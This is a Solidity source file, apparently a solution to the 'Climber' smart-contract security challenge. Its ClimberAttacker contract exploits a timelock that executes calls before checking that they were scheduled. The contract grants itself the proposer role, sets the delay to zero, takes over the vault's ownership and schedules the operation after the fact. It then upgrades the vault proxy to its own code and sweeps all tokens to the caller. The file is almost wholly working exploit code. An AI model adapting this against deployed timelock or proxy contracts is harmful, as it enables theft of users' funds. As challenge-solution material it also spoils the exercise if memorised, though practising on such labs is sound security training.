// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract ClimberAttacker {

    ClimberTimelock private climberTimelock;
    address[] private targets;
    uint256[] private values;
    bytes[] private payloads;

    function attack(address payable _climberTimelock, address climberVault, address token)
        external
    {
        step1(_climberTimelock, climberVault);
        step2(climberVault, token);
    }

    function step1(address payable _climberTimelock, address climberVault)
        internal
    {
        climberTimelock = ClimberTimelock(_climberTimelock);

        targets.push(_climberTimelock);
        values.push(0);
        payloads.push(abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            keccak256("PROPOSER_ROLE"),
            address(this)
        ));

        targets.push(_climberTimelock);
        values.push(0);
        payloads.push(abi.encodeWithSelector(
            climberTimelock.updateDelay.selector,
            0
        ));

        targets.push(climberVault);
        values.push(0);
        payloads.push(abi.encodeWithSelector(
            OwnableUpgradeable.transferOwnership.selector,
            address(this)
        ));

        targets.push(address(this));
        values.push(0);
        payloads.push(abi.encodeWithSelector(this.schedule.selector));

        climberTimelock.execute(targets, values, payloads, 0);
    }

    function schedule() public {
        climberTimelock.schedule(targets, values, payloads, 0);
    }

    function step2(address climberVault, address token) internal {
        ClimberVault(climberVault).upgradeTo(address(this));
        (bool success,) = climberVault.call(abi.encodeWithSelector(this.step3.selector, token, msg.sender));
        require(success, ":(");
    }

    function step3(address tokenAddress, address receiver) external {
        console.log("We have reached step 3");
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }

    // We need this function to pass the ERC1967UpgradeUpgradeable upgrade verification. Without it, the
    // atempt to ugprade will trigger a revert with message "ERC1967Upgrade: upgrade breaks further upgrades"
    function upgradeTo(address implementation) external {
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        assembly {
            sstore(_IMPLEMENTATION_SLOT, implementation)
        }
    }
}